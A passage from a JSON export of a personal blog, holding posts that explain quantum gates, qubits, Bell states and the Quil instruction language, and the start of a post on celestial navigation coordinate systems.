[Quantum Programming - Abstraction level 2: State Machine and Algorithms](/blog/quantum-programming-abstraction-level-2-algorithms/)\\n\\nWe have previously worked out that a quantum computer operates logically on qubits, which are the quantum counterparts of classical bits. We\'ve learned that a qubit can stay in a superposition while we operate on it, and then we can collapse it into a definite state upon measurement. So, for the majority of our time spent programming on the quantum computer, we will be thinking of the qubits in their state of superposition.\\n\\nWhat would be extremely useful for our intuition now, would be to have a way to visualise this superposition. Enter the **Bloch Sphere**. This tool allows us to represent the whole state-space of a single qubit in one (very simple) geometric shape - the unit sphere. Think of it as the unit circle in trigonometry.\\n\\n\x3c!-- truncate --\x3e\\n\\n<figure class=\\"kg-card kg-image-card kg-card-hascaption\\"><img src=\\"/content/images/2021/03/bloch-sphere-1.svg\\" class=\\"kg-image\\" alt loading=\\"lazy\\" width=\\"800\\" height=\\"800\\"/><figcaption>The state |\u03c8\u27e9 is more likely to collapse to |0\u27e9 than to |1\u27e9</figcaption></figure>\\n\\nLet\'s discuss the things that we are interested in. The two poles of the sphere (along the z axis) we arbitrarily define as the qubit being in the 0 state in the north pole, and in the 1 state in the south pole. The current state of superposition of the qubit is defined by the black vector $\\\\ket{\\\\psi}$. Our current state is in such a superposition, that it\'s closer to the o state, than the 1 state. This simply means that when we measure this qubit, we will be more likely to observe it collapsing into a zero, than into a one.\\n\\nNow, where it gets confusing, is that this is a three-dimensional sphere, and yet our state can collapse only into a single one-dimensional number - 1 or 0. Why do we even need a sphere, why not just a line with $\\\\ket{0}$ at one end, and $\\\\ket{1}$ at the other? Well, to make a long story very short, our state is actually defined by a two-dimensional vector, for example for the state \xa0$\\\\ket{1}$[^1][^2],\\n\\n$$\\n\\\\ket{1} = \\\\begin{bmatrix} 0 \\\\\\\\ 1 \\\\end{bmatrix} \\\\text{,}\\n$$\\n\\n and the components in that two-dimensional vector (called complex amplitudes) are actually complex numbers, as in for example\\n\\n$$\\n\\\\ket{1} = \\\\begin{bmatrix} 0 \\\\\\\\ \\\\frac{1}{\\\\sqrt{2}}+\\\\frac{i}{\\\\sqrt{2}} \\\\end{bmatrix} \\\\text{.}\\n$$\\n\\nAll in all that needs 4 coordinates to be geometrically described (2 for each complex number), but for [practical reasons](https://quantumcomputing.stackexchange.com/a/14151) we can ignore one of the dimensions, so we are left with 3, which we can map to the Bloch sphere.\\n\\nFurthermore, if we look closely, we will notice that we just wrote 2 identical states in two different ways. That allows us (for our purposes of building an intuition) to ignore the imaginary part of the complex components, so we can temporarily get rid of one dimension, and be left with a circle instead. Told you, you can imagine a unit circle.\\n\\n<figure class=\\"kg-card kg-image-card kg-card-hascaption\\"><img src=\\"/content/images/2021/03/bloch-circle-1.svg\\" class=\\"kg-image\\" alt loading=\\"lazy\\" width=\\"800\\" height=\\"800\\"/><figcaption>For the sake of just showing the probability of collapsing, we can for now get rid of the third dimension</figcaption></figure>\\n\\n## The X-Gate\\n\\nThe X-Gate is an equivalent of the classical NOT gate - it negates the current value of our qubit. But the way it does it is by swapping the two components of our state-vector. For example if we apply it to the definite state of 0\\n\\n$$\\nX\\\\ket{0} = X \\\\begin{bmatrix} 1 \\\\\\\\ 0 \\\\end{bmatrix} = \\\\begin{bmatrix} 0 \\\\\\\\ 1 \\\\end{bmatrix} = \\\\ket{1} \\\\text{,}\\n$$\\n\\nwe get the definite state of 1. Or when acting on a superposition state,\\n\\n$$\\nX\\\\ket{\\\\psi} = X \\\\begin{bmatrix} \\\\frac{\\\\sqrt{3}}{2} \\\\\\\\ \\\\frac{1}{2} \\\\end{bmatrix} = \\\\begin{bmatrix} \\\\frac{1}{2} \\\\\\\\ \\\\frac{\\\\sqrt{3}}{2} \\\\end{bmatrix} \\\\text{,}\\n$$\\n\\nwhich when applied to our circle looks like so\\n\\n<figure class=\\"kg-card kg-image-card kg-card-hascaption\\"><img src=\\"/content/images/2021/03/X-gate.svg\\" class=\\"kg-image\\" alt loading=\\"lazy\\" width=\\"1600\\" height=\\"800\\"/><figcaption>The new state is now opposite of the old one - the two components of its vector have been swapped.</figcaption></figure>\\n\\n> So, in our case after applying the X-Gate our state-vector has the same probability of collapsing to $\\\\ket{1}$ as it did before of collapsing into $\\\\ket{0}$ (the state was negated).\\n\\n_But why did we need a circle in the end, why not a line?_\\n\\nMind you, we also have a Y-Gate and a Z-Gate, which do the same thing, but flip the position of the vector with respect to the other 2 coordinates. Let\'s take a look at the **Z-Gate** for example.\\n\\n$$\\nZ\\\\ket{\\\\psi} = Z \\\\begin{bmatrix} \\\\frac{\\\\sqrt{3}}{2} \\\\\\\\ \\\\frac{1}{2} \\\\end{bmatrix} = \\\\begin{bmatrix} \\\\frac{\\\\sqrt{3}}{2} \\\\\\\\ \\\\frac{-1}{2} \\\\end{bmatrix} \\\\text{,}\\n$$\\n\\n<figure class=\\"kg-card kg-image-card kg-card-hascaption\\"><img src=\\"/content/images/2021/03/Z-gate-1.svg\\" class=\\"kg-image\\" alt loading=\\"lazy\\" width=\\"1600\\" height=\\"800\\"/><figcaption>The Z-Gate did nothing to change the probability of our qubit</figcaption></figure>\\n\\nIn our particular setup, by applying the Z-Gate (negation around the z axis) did nothing to change the probability distrubution of our qubit! But in order to represent what actually happened to the qubit, we needed the extra dimension provided to us by the circle relative to simply having a line. \\n\\n> We say that two states with the same probability distribution, but different state-vectors differ only by phase.\\n\\n## The Hadamard Gate\\n\\nThis is a very important gate, fundamentally quantum, with no counterpart in classical computing. You could probably have guessed it, the H-gate is the one which puts a qubit from a definite state into a state of superposition. Say we had a qubit with a hundred percent chance of being a zero. When we apply the H-gate it would turn it into a 50/50 superposition state.\\n\\n$$\\nH\\\\ket{0}=H \\\\begin{bmatrix} 1 \\\\\\\\ 0 \\\\end{bmatrix} = \\\\begin{bmatrix} \\\\frac{1}{\\\\sqrt{2}} \\\\\\\\ \\\\frac{1}{\\\\sqrt{2}} \\\\end{bmatrix} = \\\\ket{+}\\n$$\\n\\n<figure class=\\"kg-card kg-image-card kg-card-hascaption\\"><img src=\\"/content/images/2021/03/h-gate-1.svg\\" class=\\"kg-image\\" alt loading=\\"lazy\\" width=\\"1600\\" height=\\"800\\"/><figcaption>The Hadamard Gate turned a definite 0 state into a superposition. It now has equal probability of collapsing into either state.</figcaption></figure>\\n\\n## The Rz Gate\\n\\nThis is a gate which I want you to take notice of. This is a rotation around the z-axis gate. It has two things going for it - first of all it\'s a parametrised gate. This means that it takes a value, namely some angle, with which to rotate the vector. Second, I want to argue, that this is the most versitile gate there is.\\n\\nThink about it, both the X-Gate and the Hadamard gate do one thing which is not unique to any one of them - they rotate the vector for the state to some position on the sphere. And the Rz gate does exactly that, but parametrised - it rotates the vector to any degree that we want it to rotate to. Of course, since we have 3 dimensions, we can rotate around any of these axes to make full use of the vector\'s capabilities. For example the Hadamard Gate is actually a rotation around the y axis by 90 degrees or $\\\\pi/2$ radians, followed by a rotation around the x axis by 180 degrees or $\\\\pi$ radians. And the X-Gate is a rotation around the z axis by $\\\\pi$. So arguably, \\n\\n> all the gates are special cases of a linear combination of rotations around the Bloch sphere.\\n\\n$$\\nR_z(\\\\pi) \\\\ket{+}= R_z(\\\\pi) \\\\begin{bmatrix} \\\\frac{1}{\\\\sqrt{2}} \\\\\\\\ \\\\frac{1}{\\\\sqrt{2}} \\\\end{bmatrix} = \\\\begin{bmatrix} \\\\frac{1}{\\\\sqrt{2}} \\\\\\\\ \\\\frac{-1}{\\\\sqrt{2}} \\\\end{bmatrix} = \\\\ket{-}\\n$$\\n\\n<figure class=\\"kg-card kg-image-card kg-card-hascaption\\"><img src=\\"/content/images/2021/03/rz-gate.svg\\" class=\\"kg-image\\" alt loading=\\"lazy\\" width=\\"1600\\" height=\\"800\\"/><figcaption>Rotating the 50/50 state called |+\u27e9 by \u03c0 radians around the <em>z</em> axis results in the opposite 50/50 state |\u2212\u27e9</figcaption></figure>\\n\\n## The I Gate\\n\\nIf you\'ve done anything with either computer science or linear algebra, you will know that there exists the so-called identity gate (matrix). This operator simply does nothing, it leaves the state-vector as it is. Its two main purposes are\\n\\n1. Proving that the X-Gate is its own inverse.\\n2. Useful for specifying a \\"do-nothing\\" operation, i.e. _noop_.\\n\\nThe remainder of gates that can operate on one qubit are either special cases of the Rotation gate, or the general U-Gate which is the most generalised gate acting on one qubit.\\n\\nNow let\'s take a look at an example of a **gate acting on two qubits**, namely the\\n\\n## CNOT Gate\\n\\nThe CNOT gate takes two qubits as parameters, one as the control q0, and one as the target q1. What the gate does is conditionally perform an **X-Gate** (negation (along the x axis)) on the target qubit, if the control is in state $\\\\ket{1}$.\\n\\n**When our qubits are in definite states** (and by extension, if we do this on a classical computer), this becomes very simple to grasp through a _truth table_\\n\\n|input (control,target) | output (control,target) |\\n|----|-----|\\n|0,0 | 0,0 |\\n|0,1 | 0,1 |\\n|1,0 | 1,1 |\\n|1,1 | 1,0 |\\n\\n**But if we have superposition involved**, let\'s remind ourselves of two things:\\n\\n1. In our quantum circuit, when a qubit is in superposition, it\'s simultaneously in both the 0 and the 1 state.\\n2. When we change the probability distribution of 1 qubit, we ultimately change the probability distribution of the states of the whole system of qubits.\\n\\nWhat does this tell us? Well, \\n\\n1. if say the control bit is in a superposition, then it will be in both the one and zero state.\\n2. So for certain states of the whole system it will be a one.\\n3. In those system states the target bit will be negated by the X-Gate as per the definition of the CNOT gate.\\n4. The probability distribution of the whole system will change.\\n\\nThis is where it really starts get mind-bogglingly difficult to follow the logic by simply imagining it. So let\'s analyse a few situations of using the CNOT with superposition involved.\\n\\n### Both the control and the target are Hadamard-ed\\n\\nAs we saw in the **Rz Gate** section, in our circle we can have two locations where the qubit has 50/50 probability of collapsing. We designate those two states as $\\\\ket{+}$ for pointing along x and $\\\\ket{-}$ when pointing towards -x. So we can initialise our qubits to be in either one of them, and then apply the CNOT gate on them using _q0_ as the control, and _q1_ as the target. After quite a bit of calculation we will see the following truth table\\n\\n|input $\\\\ket{control,target}$ | output $\\\\ket{control,target}$ |\\n|-----------|------------|\\n|$\\\\ket{++}$ | $\\\\ket{++}$ |\\n|$\\\\ket{+-}$ | $\\\\ket{--}$ |\\n|$\\\\ket{-+}$ | $\\\\ket{-+}$ |\\n|$\\\\ket{--}$ | $\\\\ket{+-}$ |\\n\\nIf we look closely we will notice something unexpected. Remember, in the CNOT gate the control bit is supposed to remain unchanged, and the target one to flip whenever it\'s supposed to. But in our scenario, the target qubit remains always unchanged, but the control qubit flips according to the state of the target bit.\\n\\n> All of a sudden the sense of control and target bits has reversed.\\n\\nThis fact can be extended further, and used when building quantum algorithms. Suddenly new phenomena start appearing, such as _CNOT Circuit Identity_ and _Phase Kickback_. We will explore these as we ascend one more step of abstraction next time.\\n\\n### Building a Bell State\\n\\nWhen it comes to the physics of the qubits, there\'s one more weird phenomenon to explore, which comes directly from quantum mechanics - entanglement.\\n\\nLet\'s take a pure definite state of two qubits such that $\\\\ket{00}$, or in other words both qubits are definitely zeroes. We can write that as a global state-vector[^3]\\n\\n$$\\n\\\\text{State-vector = } \\\\begin{bmatrix} 1 \\\\\\\\ 0 \\\\\\\\ 0 \\\\\\\\ 0 \\\\end{bmatrix} \\\\text{.}\\n$$\\n\\nOr more clearly, in a table of probabilities[^4]\\n\\n|probability | system after measured (q1,q0) |\\n|-----|----|\\n|100% | 00 |\\n|0% | 01 |\\n|0% | 10 |\\n|0% | 11 |\\n\\nIf we apply a Hadamard gate to the control bit making it into state $\\\\ket{+}$, we get\\n\\n$$\\n\\\\text{State-vector = } \\\\begin{bmatrix} \\\\frac{1}{\\\\sqrt{2}} \\\\\\\\ \\\\frac{1}{\\\\sqrt{2}} \xa0\\\\\\\\ 0 \\\\\\\\ 0 \\\\end{bmatrix} \\\\text{,}\\n$$\\n\\nwhich we can read as \\"_q0_ is in superposition, and _q1_ is in definite state 0\\". In this scenario, our system probability table looks like so\\n\\n|probability | system after measured (q1,q0) |\\n|----|----|\\n|50% | 00 |\\n|50% | 01 |\\n|0% | 10 |\\n|0% | 11 |\\n\\n**and we can still reason for each qubit separately, i.e. _q1_ can\'t be a 1, and _q0_ can be either.**\\n\\nFinally, apply the CNOT on a target bit _q1_, which is still in state $\\\\ket{0}$. The state-vector becomes\\n\\n$$\\n\\\\text{State-vector = } \\\\begin{bmatrix} \\\\frac{1}{\\\\sqrt{2}} \\\\\\\\ 0 \\\\\\\\ 0 \\\\\\\\ \\\\frac{1}{\\\\sqrt{2}} \xa0\\\\end{bmatrix} \\\\text{.}\\n$$\\n\\nOr in our more readable format of probability tables\\n\\n|probability | system after measured (q1,q0) |\\n|----|----|\\n|50% | 00 |\\n|0% | 01 |\\n|0% | 10 |\\n|50% | 11 |\\n\\nWe can see, that the system now has 50% chance of being 00, and 50 of being 11. \\n\\n**But if we try reading this by splitting the state-vector into state-vectors of two separate qubits, we will be unpleasantly surprised. **\\n\\n* Let\'s say we look at state 00. It has 50% chance, which would mean that if we try to take only _q1_, we would expect it to have at least some probability of    being 0 on its own.\\n* But if we look at state 01, it has 0% chance. This can maybe hint us into thinking that _q0_ **can\'t** be a 1, and therefore 01 is impossible.\\n* But state 11 also has probability 50%. So _q0_ **can** be a 1. \\n\\nThis no longer makes sense (as the probabilities don\'t add up to 1), and has interesting implications. We can no longer consider these two qubits as separate. Measuring one will affect the other.\\n\\nThere\'s only one explanation here - we have successfully entangled the particles. If we only measure _q0_, and it appears as a zero, we will be sure that _q1_ is also a zero.\\n\\nEntanglement is the final purely-quantum concept that we needed to tackle. Now we have built an abstraction machine, which allows us to manipulate both single and multiple qubits at once, and started to see how dealing with multiple qubits can have extremely weird effects on our computational techniques. From now on we can concentrate on using this weirdness to build our next level of abstraction on our way to creating actual code - circuits and algorithms. So let\'s do that next time!\\n\\n [^1]: I guess it would be important here to note, that the probabilities that we talked so much about last time are the squares of the components (complex amplitudes) of the vector. So for example if our state is\\n $$\\\\begin{bmatrix} \\\\frac{\\\\sqrt{3}}{2} \\\\\\\\ \\\\frac{-1}{2} \\\\end{bmatrix} \\\\text{,}$$ then the qubit has $\\\\big( \\\\frac{\\\\sqrt{3}}{2} \\\\big)^2 = \\\\frac{3}{4}$ chance of collapsing into a 0, and $\\\\big( \\\\frac{-1}{2} \\\\big)^2 = \\\\frac{1}{4}$ chance of collapsing into a 1. When we sum them up, we get a 1, which is what we would expect from probabilities.\\n\\n[^2]: Additionally, it\'s not a coincidence that the states are represented by vectors. All the gates that we can have on qubits are actually linear operators, which we can represent using matrices. You can never know too much linear algebra...\\n\\n[^3]: System [state-vectors](https://qiskit.org/textbook/ch-gates/multiple-qubits-entangled-states.html#1.-Representing-Multi-Qubit-States-) of the whole qubit circuit are created by placing the probabilities of all system states in a 4D matrix. The collective state of a number of qubits on the other hand is calculated using a [tensor product](https://en.wikipedia.org/wiki/Tensor_product#Tensor_product_of_linear_maps) of the state-vectors of each qubit.\\n\\n[^4]: Both notations are really showing the same thing, it\'s just that the state-vector shows the complex amplitude of that system state, while the probability table squares it to get the probability associated with that system state $\\\\text{State-vector = } \\\\begin{bmatrix} a_{00} \\\\\\\\ a_{01} \\\\\\\\ a_{10} \\\\\\\\ a_{11} \\\\end{bmatrix} \xa0= \xa0\\\\begin{bmatrix} \\\\frac{1}{\\\\sqrt{2}} \\\\\\\\ \\\\frac{1}{\\\\sqrt{2}} \xa0\\\\\\\\ 0 \\\\\\\\ 0 \\\\end{bmatrix} \\\\text{,}$ where $a$ is the complex amplitude of each state of the two qubits _q1_,_q0_ (see table above).\\n\\nimport DonateCard from \'@site/src/components/DonateCard\';\\n\\n<DonateCard/>\\n\\n---\\n|probability | system after measured (q1,q0) |\\n|-------------------------------|----|\\n|50% = $(\\\\frac{1}{\\\\sqrt{2}})^2$ | 00 |\\n|50% = $(\\\\frac{1}{\\\\sqrt{2}})^2$ | 01 |\\n|0% = $0^2$ | 10 |\\n|0% = $0^2$ | 11 |"},{"id":"quantum-programming-abstraction-level-0","metadata":{"permalink":"/blog/quantum-programming-abstraction-level-0","source":"@site/blog/2021-03-27-22:27:23quantum-programming-abstraction-level-0.md","title":"Quantum Programming by abstracting ourselves from Quantum Mechanics: Abstraction level 0","description":"Just as we know that in classical computers we manipulate logical zeroes and ones, we can get an idea of what we are dealing with in the lowest level of logic in a quantum computer.","date":"2021-03-27T00:00:00.000Z","formattedDate":"March 27, 2021","tags":[{"label":"Science","permalink":"/blog/tags/science"},{"label":"Physics","permalink":"/blog/tags/physics"},{"label":"Computing","permalink":"/blog/tags/computing"},{"label":"Quantum","permalink":"/blog/tags/quantum"},{"label":"Programming","permalink":"/blog/tags/programming"},{"label":"Computer Science","permalink":"/blog/tags/computer-science"}],"readingTime":9.7,"hasTruncateMarker":true,"authors":[{"name":"Kiril Panayotov Blagoev","title":"Admin","url":"https://github.com/tihawk","imageURL":"https://github.com/tihawk.png","key":"kiroki"}],"frontMatter":{"slug":"quantum-programming-abstraction-level-0","title":"Quantum Programming by abstracting ourselves from Quantum Mechanics: Abstraction level 0","description":"Just as we know that in classical computers we manipulate logical zeroes and ones, we can get an idea of what we are dealing with in the lowest level of logic in a quantum computer.","authors":"kiroki","tags":["Science","Physics","Computing","Quantum","Programming","Computer Science"]},"prevItem":{"title":"Quantum Programming - Abstraction level 1: Logic Gates","permalink":"/blog/quantum-programming-abstraction-level-1-logic-gates"},"nextItem":{"title":"Celestial Navigation - coordinate systems","permalink":"/blog/astronavigation-coordinate-systems"}},"content":"1. [Quantum Programming by abstracting ourselves from Quantum Mechanics: Abstraction level 0](/blog/quantum-programming-abstraction-level-0/) (this)\\n2. [Quantum Programming - Abstraction level 1: Logic Gates](/blog/quantum-programming-abstraction-level-1-logic-gates/)\\n3. [Quantum Programming - Abstraction level 2: State Machine and Algorithms](/blog/quantum-programming-abstraction-level-2-algorithms/)\\n\\nThe invention of the personal computer, and the further development of the [hundreds](https://en.wikipedia.org/wiki/List_of_programming_languages) of programming languages which utilise it has allowed us programmers to completely **abstract** ourselves from the world of electrons flowing through solid matter, and further from the low level programming of turning gates and transistors on and off to produce binary data.\\n\\n\x3c!-- truncate --\x3e\\n\\nAnd this seems to be the way we as a technological society operate. We like to build abstractions on top of abstractions, until we can communicate with our machines in an as humanly a way as we find easy, and still practical.\\n\\nAs solving problems on a quantum machine becomes more of a practical reality, we will be able to start using the terms _applied_ and _quantum mechanics_ in the same context. This would be a time, in which we would be able to abstract ourselves from the _how and why_ of quantum mechanics, and simply utilise its weirdness in real world applications.\\n\\nBut just as we know that in classical computers ultimately it all comes down to ones and zeroes being flipped around in a memory grid, we have to have an idea of what we are dealing with in the lowest level of logic in a quantum computer. What are our basic logical constructs allowing us to build and manipulate data, when it comes to quantum computing.\\n\\n## Parallels to classical computers\\n### Qubits vs bits\\n\\nWe have to establish a logic timeline here. In classical computers we have certain steps with which we make a calculation. Let\'s concentrate on two in particular.\\n\\n1. We manipulate a bit\'s value. We can either flip its value from $0$ to $1$ or from $1$ to $0$, or keep it as it is.\\n2. Now we can measure the bit\'s value. We will now observe whether it\'s a $1$ or a $0$.\\n\\nWe can also note that, after measuring it, the bit continues being whatever it was before we observed its value, the act of measuring did nothing to change that.\\n\\nIt stands to reason, that if we kept track of what\'s going on, we would already know whether the bit was a 1 or a 0 before even measuring it. As we will see in a second though,\\n\\n> In the majority of cases, we will have no way of knowing a quantum bit\'s value before measuring it.\\n\\n### Qubits\\n\\nThe qubits can also be in the state of 1 or 0, but they can also be in both states at the same time. And when they are in this so called superposition, the states of 0 and 1 are associated with a probability - that is if you take a qubit and measure it, it will choose whether to appear as a 0 or a 1 depending on that probability[^1].\\n\\nThis is important to note - a qubit can hold onto its superposition only as long as it\'s not being measured. The moment its value is being extracted, the wavefunction defining its probability collapses, and it randomly chooses to be a 0 or a 1 according to its probability before the collapse.\\n\\nAnother point to make here, is that we can manipulate the bits in such a way, that the probability is 100% for it being either 1 or a 0. This way, we can use a quantum computer basically the same way as we would use a classical one. But we would also lose one of the advantages of a quantum computer - utilising the quantum weirdness brought by superposition (and later entanglement).\\n\\n### Clumping the qubits together\\n\\nLet\'s consider now that we have many more than one bits in our memory bank. Let\'s say we have 3! Let\'s put their possible values of 1 and 0 in a table of all possible states of the system\\n\\n| state | q2 | q1 | q0 |\\n|--|---|---|---|\\n|1 | 0 | 0 | 0 |\\n|2 | 0 | 0 | 1 |\\n|3 | 0 | 1 | 0 |\\n|4 | 0 | 1 | 1 |\\n|5 | 1 | 0 | 0 |\\n|6 | 1 | 0 | 1 |\\n|7 | 1 | 1 | 0 |\\n|8 | 1 | 1 | 1 |\\n\\nWe can now observe, that there are 8 states in this system of 3 bits. With 4 bits you get 16 states, with 8 - 256, and so on growing exponentially, such that the number of states is equal to 2 to the power of number of bits. In other words, for each bit added, the number of states doubles.\\n\\n$$\\nn_{states} = 2^{m_{bits}}\\n$$\\n\\nThis is no different to holding information in a grid of bits. The difference comes when we try to access those states to manipulate or measure them. When a computer does operations on a state, it loads it into a register. In a single CPU inside a classical computer, a single state can be loaded into the register and manipulated. What\'s interesting is that the quantum register as such stores all $2^n$ possible states at the same time, and can simultaniously change all of them by changing a single qubit\'s probability distribution.\\n\\nLet\'s expand a bit on that. Imagine the quantum register as a simple physical grid of qubits, each qubit containing information about its probability of collapsing into either a 1 or a 0. If we take the probabilities of all qubits, we can easily calculate the probability of each of the system states that we listed above appearing when we collapse the whole register. For example, assuming that all 3 qubits have a 50/50 chance of collapsing into a 1 or a 0, we would see that all states have equal probability as well, and we know that the probabilities should add up to 1:\\n\\n|probability | q2 | q1 | q0 |\\n|------|---|---|---|\\n|12.5% | 0 | 0 | 0 |\\n|12.5% | 0 | 0 | 1 |\\n|12.5% | 0 | 1 | 0 |\\n|12.5% | 0 | 1 | 1 |\\n|12.5% | 1 | 0 | 0 |\\n|12.5% | 1 | 0 | 1 |\\n|12.5% | 1 | 1 | 0 |\\n|12.5% | 1 | 1 | 1 |\\n\\nSo we can redefine the information held inside a quantum register as the list of probabilities for every single state occurring when we observe the system. As this list is the same length as the list of all possible states, the quantum register holds information equal to $2^{\\\\text{number of bits}}$. The catch of course is, that when we measure the system, it collapses to one of the states, and then we have information equal to the number of bits.\\n\\nBut before we measure the system,\\n\\n> if we change the probability of just one qubit, we change the probability distribution of all states immediately.\\n\\nLet\'s say that we change the probability of q2 to be such that it has a 100% chance of being a 0. Then we get\\n\\n|probability | q2 | q1 | q0 |\\n|------|---|---|---|\\n|25% | 0 | 0 | 0 |\\n|25% | 0 | 0 | 1 |\\n|25% | 0 | 1 | 0 |\\n|25% | 0 | 1 | 1 |\\n|0% | 1 | 0 | 0 |\\n|0% | 1 | 0 | 1 |\\n|0% | 1 | 1 | 0 |\\n|0% | 1 | 1 | 1 |\\n\\nIn other words, all states in which q2 is 1 are impossible, and the other 4 states have equal probability.\\n\\nThe next issue is that when we collapse the system, we will get one of the above states. We still don\'t know what the probabilities are, we just know that one of the states are possible. But,\\n\\n> if we collapse the system multiple times, after setting up the qubits the same way every time, we will get statstical information about the probability of each state occurring.\\n\\n### Logic Gates\\n\\nSo, in order to change the probability of each state occurring, we need to manipulate the probability of each qubit. In a classical computer, in order to manipulate a bit we use [logic gates](https://en.wikipedia.org/wiki/Logic_gate)  such as NOT, SET1, SET0 and IDENTITY for single bits, and AND, OR, XOR, etc. for two bits.[^2]\\n\\nIn an analagous way, we have logical gates in the quantum world. Some of them are for operating on one qubit, some of them for two, and you can have ones operating on three. There are many logical gates that can be defined for qubits, and really as long as one obeys the mathematical constraints of QM, the possibilities are endless. But thankfully, [it\'s been proven](https://en.wikipedia.org/wiki/Solovay%E2%80%93Kitaev_theorem), that any operation on a quantum computer can be effectively reduced to a finite number of gates, so that we can define a small enough **instruction set** with which we can manipulate the qubits into any probability that we require.\\n\\n## Quil - a Quantum Instruction Language\\n\\nWe have now reached our first level of abstraction in quantum programming - the instruction set. We can now basically define an [assembly-like](https://en.wikipedia.org/wiki/Assembly_language) language to write code in for quantum computers. Let\'s have a technical definition of this abstraction, before finishing this post. I want to concentrate on the actual gates in a separate post, as this will become too unwieldy otherwise.\\n\\n### QAM - Quantum Abstract Machine\\n\\nThis is an abstract representation of a general-purpose quantum computing device (a quantum computer). Notably, QAM defines manipulation techniques for both classical and quantum states. This means that we will have both qubits to work with, and classical bits to store observation data in. As such QAM is specified by a list of elements:\\n\\n* The number of qubits\\n* A number of classical bits (e.g. for storing the collapsed states of the qubits)\\n* A list of gates to manipulate the qubits with\\n* A sequence of instructions specifying the quantum instruction language\\n* An integer counter indicating the position of the next instruction to execute\\n\\nWith this, we are now free to define gates and assembly-like instructions, with which to manipulate the probabilities of single or multiple qubits, ultimately changing the probability distribution of the states of the qubit circuit. In the next post we get into defining the Bloch sphere, and a list of gates that operate on it - reaching [abstraction level 1](https://kblagoev.com/blog/quantum-programming-abstraction-level-1-logic-gates/).\\n\\n[^1]: Mind you, there\'s nothing magical about that statement, it\'s just a fact of nature that we can\'t experience in the macroscopic world - any elementary particle left to its own accords will stay in a superposition of all of its possible states, until it\'s acted upon (observed), at which point its wavefunction which holds information about the probability of all its states collapses, and the particle chooses one of those possible states at random.\\n[^2]: Without going into much detail I want to point out some facts: 1. Classical computer gates are mostly irreversible, meaning that after the application of a gate, you can\'t figure out what the original input was. Quantum ones are all required to be reversible due to the physics of QM. 2. Quantum gates are represented by unitary matrices. Extremely useful. In fact I will probably write a second version of all of this, from the point of view of linear algebra, because it\'s so satisfying to look at.\\n\\nimport DonateCard from \'@site/src/components/DonateCard\';\\n\\n<DonateCard/>"},{"id":"astronavigation-coordinate-systems","metadata":{"permalink":"/blog/astronavigation-coordinate-systems","source":"@site/blog/2020-07-25-20:54:07astronavigation-coordinate-systems.md","title":"Celestial Navigation - coordinate systems","description":"It\'s just like remembering where a distant house at an edge of a field is, then moving around the field, and checking where the house is now relative to us. If the house was distant enough, and coincidentally always north of you, you would call it the polar star.","date":"2020-07-25T00:00:00.000Z","formattedDate":"July 25, 2020","tags":[{"label":"Science","permalink":"/blog/tags/science"}],"readingTime":10.68,"hasTruncateMarker":true,"authors":[{"name":"Kiril Panayotov Blagoev","title":"Admin","url":"https://github.com/tihawk","imageURL":"https://github.com/tihawk.png","key":"kiroki"}],"frontMatter":{"slug":"astronavigation-coordinate-systems","title":"Celestial Navigation - coordinate systems","description":"It\'s just like remembering where a distant house at an edge of a field is, then moving around the field, and checking where the house is now relative to us. If the house was distant enough, and coincidentally always north of you, you would call it the polar star.","authors":"kiroki","tags":["Science"]},"prevItem":{"title":"Quantum Programming by abstracting ourselves from Quantum Mechanics: Abstraction level 0","permalink":"/blog/quantum-programming-abstraction-level-0"},"nextItem":{"title":"On approximating irrational numbers as fractions (algorithms)","permalink":"/blog/on-approximating-irrational-numbers-as-fractions-algorithms"}},"content":"Nowadays you would be hard-pressed to amaze anyone with the knowledge that stars are these ever-moving objects in the sky, at wildly different distances from us and each-other. Not only that, but many of the objects in the night sky we recognise as stars are often whole galaxies containing billions of stars, or giant clouds of gas glowing with the intensity of stars in our eyes, or god knows what else.\\n\\n\x3c!-- truncate --\x3e\\n\\nBut not always was that knowledge which humans posessed. After all, if you just go out in the pitch-black of the night and look up with an unarmed eye (or two) - all you see are dots in the inky sky [(or not)](https://en.wikipedia.org/wiki/Light_pollution). Some brighter than others - yes, but not so much that it would make you question the distances between them. In fact you might even find it difficult to believe that if you pick two random stars, chances are the distance between them is close to or greater than between them and us.\\n\\nSo naturally the easier to grasp visualisation is that they are simply objects more or less equidistant from Earth (after all our little planet used to be in the centre of the universe), maybe just sprinkled on the inside of a spherical black fabric at the edge of the universe[^1], looking towards us at the centre of it all.\\n\\nNow, we might know that this is completely and utterly wrong, but we as humans have this extremely useful most of the time tool called abstraction. We were already able to imagine that the stars are stationary equidistant from Earth objects. It\'s very easy to imagine in fact, considering they are so far away, that they don\'t move relative to each other as we move along the Earth\'s surface. So for our practical purposes as naked-eye observers, we can make up a projection, in which they are in fact as we say - stationary objects on the surface of a sphere centered around Earth. And as we make this approximation, we all of a sudden end up with something which can be extremely useful.\\n\\n### Any stationary object can be used as a reference point for a moving object!\\n\\nSo now we can map these star-like objects, record where they are positioned relative to a point on Earth; then if we move ourselves on the surface of the Earth we can say where we\'ve gone by just checking how the position of the stars has shifted with respect to us. It\'s just like remembering where a distant house at an edge of a field is, then moving around the field, and checking where the house is now relative to us. If the house was distant enough, and coincidentally always north of you, you would call it the polar star.\\n\\n### _If it were only that simple..._\\n\\nEven though the rough idea is absolutely true, and good enough on a small enough scale (like crossing a field following the polar star), it becomes troublesome once you start requiring any type of accuracy in your endeavour. There are two main problems which we will encounter almost immediately.\\n\\n### The celestial sphere isn\'t actually stationary.\\n\\nThe stars may be stationary with respect to each other (the polar star doesn\'t move away from or towards Sirius for example), but the whole **celestial sphere** on which they are positioned rotates similar to the sun and wobbles up and down (with respect to the horizon) as the months pass. Or in 21st century speak, the Earth rotates around its axis daily, and moves in a tilted manner through space as it rotates around the Sun.\\n\\n**The solution** to this is rather trivially to just observe the motion of the celestial sphere for a while, find the law which governs it, and start printing annual [Almanac](https://en.wikipedia.org/wiki/Almanac) with information about the position of stars throughout the year.\\n\\n## What coordinates do you use for the stars?\\nThe problem is that we as observers can only record where we see the star w.r.t our reference frame. That is, we can\'t do any measurement that will immediately say \\"oh, the star is currently 30 degrees east of Greenwich\\". If we could, we could have easily just said where we were, and not had needed to measure the star at all.\\n\\n> So we need a coordinate system for the position of the star with respect to us.\\n\\nBut on the other hand, the books which tell us where the star should be now, would have no idea where it should be with respect to us as observers. If it did, it would had predicted our future, and the position of the star would have been the least of our interests. [We would have proven the deterministic nature of the universe.](https://en.wikipedia.org/wiki/Determinism)\\n\\n> So we need one more coordinate system - an absolute position of the star on the surface of the celestial sphere.\\n\\n> And since we as observers reside not on the celestial sphere (rather disappointing, I know), we need our good old Earthbound 